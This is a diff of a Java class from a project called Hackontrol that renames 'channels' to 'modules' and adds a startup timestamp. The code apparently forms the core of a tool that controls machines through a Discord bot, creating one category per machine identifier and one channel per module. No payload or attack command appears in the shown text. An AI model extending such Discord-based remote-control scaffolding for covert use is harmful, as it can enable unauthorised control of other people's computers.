@@ -8,8 +8,9 @@ import org.slf4j.LoggerFactory;
 
 import com.khopan.hackontrol.logger.HackontrolLoggerConfig;
 import com.khopan.hackontrol.manager.Manager;
-import com.khopan.hackontrol.registration.ChannelRegistry;
+import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.registration.ManagerRegistry;
+import com.khopan.hackontrol.registration.ModuleRegistry;
 import com.khopan.hackontrol.registry.ClassRegistration;
 import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
@@ -27,21 +28,23 @@ import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
 	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY;
-	public static final RegistryType<Void, Class<? extends HackontrolChannel>> CHANNEL_REGISTRY;
+	public static final RegistryType<Void, Class<? extends Module>> MODULE_REGISTRY;
 
 	public static final Logger LOGGER;
+	public static final long STARTUP_TIME;
 
 	private static Hackontrol INSTANCE;
 
 	static {
+		STARTUP_TIME = System.currentTimeMillis();
 		NativeLibrary.load();
 		MANAGER_REGISTRY = RegistryType.create();
-		CHANNEL_REGISTRY = RegistryType.create();
+		MODULE_REGISTRY = RegistryType.create();
 		LOGGER = LoggerFactory.getLogger("Hackontrol");
 	}
 
 	private final List<Manager> managerList;
-	private final List<HackontrolChannel> channelList;
+	private final List<Module> moduleList;
 	private final JDA bot;
 	private final Guild guild;
 	private final String machineIdentifier;
@@ -53,13 +56,12 @@ public class Hackontrol {
 		Hackontrol.INSTANCE = this;
 		Thread.setDefaultUncaughtExceptionHandler(this :: handleError);
 		ManagerRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.MANAGER_REGISTRY));
-		ChannelRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.CHANNEL_REGISTRY));
+		ModuleRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.MODULE_REGISTRY));
 		this.managerList = ClassRegistration.list(null, Hackontrol.MANAGER_REGISTRY);
-		this.channelList = ClassRegistration.list(null, Hackontrol.CHANNEL_REGISTRY);
+		this.moduleList = ClassRegistration.list(null, Hackontrol.MODULE_REGISTRY);
 
-		for(int i = 0; i < this.channelList.size(); i++) {
-			HackontrolChannel channel = this.channelList.get(i);
-			Hackontrol.LOGGER.info("Registered channel: {}", channel.getClass().getName());
+		for(int i = 0; i < this.moduleList.size(); i++) {
+			Hackontrol.LOGGER.info("Registered module: {}", this.moduleList.get(i).getClass().getName());
 		}
 
 		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);
@@ -80,19 +82,19 @@ public class Hackontrol {
 		this.machineIdentifier = Machine.getIdentifier();
 		this.category = this.getOrCreateCategory(this.guild, this.machineIdentifier);
 
-		for(int i = 0; i < this.channelList.size(); i++) {
-			HackontrolChannel channel = this.channelList.get(i);
-			TextChannel textChannel = this.getOrCreateTextChannelInCategory(this.category, channel.getName());
-			channel.hackontrol = this;
-			channel.category = this.category;
-			channel.channel = textChannel;
-			channel.preInitialize(RegistryImplementation.of(channel));
+		for(int i = 0; i < this.moduleList.size(); i++) {
+			Module module = this.moduleList.get(i);
+			TextChannel textChannel = this.getOrCreateTextChannelInCategory(this.category, module.getName());
+			module.hackontrol = this;
+			module.category = this.category;
+			module.channel = textChannel;
+			module.preInitialize(RegistryImplementation.of(module));
 
 			if(this.isChannelEmpty(textChannel)) {
-				channel.initialize();
+				module.initialize();
 			}
 
-			channel.postInitialize();
+			module.postInitialize();
 		}
 
 		for(int i = 0; i < this.managerList.size(); i++) {
@@ -170,37 +172,37 @@ public class Hackontrol {
 		return null;
 	}
 
-	public List<HackontrolChannel> getChannelList() {
-		return Collections.unmodifiableList(this.channelList);
+	public List<Module> getModuleList() {
+		return Collections.unmodifiableList(this.moduleList);
 	}
 
 	@SuppressWarnings("unchecked")
-	public <T extends HackontrolChannel> T getChannel(Class<T> channelClass) {
-		if(channelClass == null) {
-			throw new NullPointerException("Channel class cannot be null");
+	public <T extends Module> T getModule(Class<T> moduleClass) {
+		if(moduleClass == null) {
+			throw new NullPointerException("Module class cannot be null");
 		}
 
-		for(int i = 0; i < this.channelList.size(); i++) {
-			HackontrolChannel channel = this.channelList.get(i);
+		for(int i = 0; i < this.moduleList.size(); i++) {
+			Module module = this.moduleList.get(i);
 
-			if(channelClass.isAssignableFrom(channel.getClass())) {
-				return (T) channel;
+			if(moduleClass.isAssignableFrom(module.getClass())) {
+				return (T) module;
 			}
 		}
 
 		return null;
 	}
 
-	public HackontrolChannel getChannel(TextChannel textChannel) {
+	public Module getModule(TextChannel textChannel) {
 		if(textChannel == null) {
 			throw new NullPointerException("Text channel cannot be null");
 		}
 
-		for(int i = 0; i < this.channelList.size(); i++) {
-			HackontrolChannel channel = this.channelList.get(i);
+		for(int i = 0; i < this.moduleList.size(); i++) {
+			Module module = this.moduleList.get(i);
 
-			if(textChannel.equals(channel.channel)) {
-				return channel;
+			if(textChannel.equals(module.channel)) {
+				return module;
 			}
 		}
 
